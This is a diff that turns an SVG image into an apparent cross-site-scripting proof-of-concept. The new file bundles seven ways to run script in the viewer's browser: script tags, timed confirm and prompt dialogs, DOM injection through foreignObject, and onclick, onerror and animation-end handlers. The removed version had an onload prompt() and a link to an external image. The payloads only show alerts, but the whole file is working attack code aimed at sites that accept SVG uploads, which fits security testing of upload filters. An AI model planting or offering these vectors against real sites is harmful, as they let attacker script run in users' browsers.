@@ -1,9 +1,70 @@
 <?xml version="1.0" standalone="no"?>
 <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="300">
-    <image xlink:href="https://raw.githubusercontent.com/Zprogrammer01/TEST/7b104c66e1e6d0a7e0c9751d8d486020fec940ef/aaaaaa.svg" onload="prompt(1da)" x="0" y="0" width="400" height="300" preserveAspectRatio="xMidYMid meet" />
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="600" height="400">
+    <!-- Visual Elements -->
+    <rect x="0" y="0" width="600" height="400" fill="rgb(0,0,255)" stroke="black" stroke-width="3" onclick="alert('XSS PoC: Clicked rectangle!');" />
+    <text x="300" y="50" font-size="20" text-anchor="middle" fill="white" style="text-shadow: 2px 2px 4px #000;">XSS PoC: Multiple Alerts (Click or Wait)</text>
+    
+    <!-- Technique 1: Standard Alert (Immediate) -->
     <script>
-        
+        alert('XSS PoC: Standard alert triggered on load');
     </script>
-    <text x="200" y="20" font-size="16" text-anchor="middle" fill="white" style="text-shadow: 2px 2px 4px #000;">XSS PoC: Redirecting...</text>
+    
+    <!-- Technique 2: Confirm Dialog (After 2 seconds) -->
+    <script>
+        setTimeout(() => {
+            confirm('XSS PoC: Confirm dialog - click OK or Cancel');
+        }, 2000);
+    </script>
+    
+    <!-- Technique 3: Prompt Dialog (After 4 seconds) -->
+    <script>
+        setTimeout(() => {
+            prompt('XSS PoC: Prompt dialog - enter text', 'Type here');
+        }, 4000);
+    </script>
+    
+    <!-- Technique 4: Custom DOM-Based Pop-Up (After 6 seconds) -->
+    <script>
+        setTimeout(() => {
+            const popup = document.createElementNS('http://www.w3.org/2000/svg', 'foreignObject');
+            popup.setAttribute('x', '150');
+            popup.setAttribute('y', '100');
+            popup.setAttribute('width', '300');
+            popup.setAttribute('height', '100');
+            const div = document.createElement('div');
+            div.style.background = 'white';
+            div.style.border = '2px solid black';
+            div.style.padding = '10px';
+            div.style.textAlign = 'center';
+            div.innerHTML = 'XSS PoC: Custom DOM pop-up<br><button onclick="this.parentNode.parentNode.remove()">Close</button>';
+            popup.appendChild(div);
+            document.querySelector('svg').appendChild(popup);
+        }, 6000);
+    </script>
+    
+    <!-- Technique 5: ForeignObject with HTML Pop-Up (After 8 seconds) -->
+    <foreignObject x="150" y="220" width="300" height="100">
+        <body xmlns="http://www.w3.org/1999/xhtml">
+            <script>
+                setTimeout(() => {
+                    const div = document.createElement('div');
+                    div.style.background = 'yellow';
+                    div.style.border = '2px solid red';
+                    div.style.padding = '10px';
+                    div.style.textAlign = 'center';
+                    div.innerHTML = 'XSS PoC: HTML pop-up via foreignObject<br><button onclick="this.parentNode.remove()">Close</button>';
+                    document.body.appendChild(div);
+                }, 8000);
+            </script>
+        </body>
+    </foreignObject>
+    
+    <!-- Technique 6: Image with onerror Trigger -->
+    <image xlink:href="invalid.png" x="0" y="0" width="1" height="1" onerror="alert('XSS PoC: Image onerror triggered');" />
+    
+    <!-- Technique 7: Animation with onend Trigger -->
+    <circle cx="50" cy="50" r="20" fill="red">
+        <animate attributeName="r" from="20" to="30" dur="2s" begin="10s" fill="freeze" onend="alert('XSS PoC: Animation onend triggered');" />
+    </circle>
 </svg>
